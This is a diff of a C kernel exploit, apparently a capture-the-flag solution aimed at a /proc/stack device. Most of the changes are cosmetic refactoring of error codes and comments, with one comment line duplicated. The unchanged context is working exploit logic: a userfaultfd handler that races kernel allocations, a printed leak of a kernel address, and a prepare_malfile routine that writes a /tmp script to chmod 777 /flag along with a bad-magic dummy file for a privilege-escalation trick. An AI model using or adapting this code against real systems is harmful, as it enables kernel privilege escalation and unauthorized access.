@@ -20,25 +20,27 @@
 #include <poll.h>
 #include <linux/userfaultfd.h>
 
-/* Definition of error number */
-#define ERR_UFFD_SYSCALL	-1
-#define ERR_UFFDAPI_IOCTL	-2
-#define ERR_MMAP			-3
-#define ERR_UFFDREG			-4
-#define ERR_OOTHER			-100
-
 #define CMD_PUSH			0x57ac0001
 #define CMD_POP				0x57ac0002
+
+/* Definition of error number */
+/* Definition of error number */
+enum {
+        ERR_UFFD_SYSCALL = 1,
+        ERR_UFFDAPI_IOCTL,
+        ERR_MMAP,
+        ERR_UFFDREG,
+        ERR_OOTHER
+};
 
 typedef struct {
 	void *addr;
 	long uffd;
 } uffd_t;
 
+/* Global virables */
 long pagesz = 0;
-
 uffd_t me = {0};
-
 /* exploit phase */
 int phase = 1;
 /* file descriptor of /proc/stack */
@@ -159,7 +161,7 @@ static void * userfaultfd_handler (void *arg)
 				printf("[DEBUG] leaked kernel address:%lx\n", leaked_addr);
 			}
 			else
-			{
+			{	//Third time in userfaultfd handler
 				printf("in %s second time.\n", __FUNCTION__);
 				unsigned long tmp = 0xdeadbeef;
 				push (fd, &tmp); // To allocate chunk again, it's content doesn't matter
@@ -218,7 +220,7 @@ static int alloc_and_free_shm_file_data ()
 
 void prepare_malfile ()
 {
-	system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/x");
+    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/x");
     system("chmod +x /tmp/x");
     system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
     system("chmod +x /tmp/dummy");
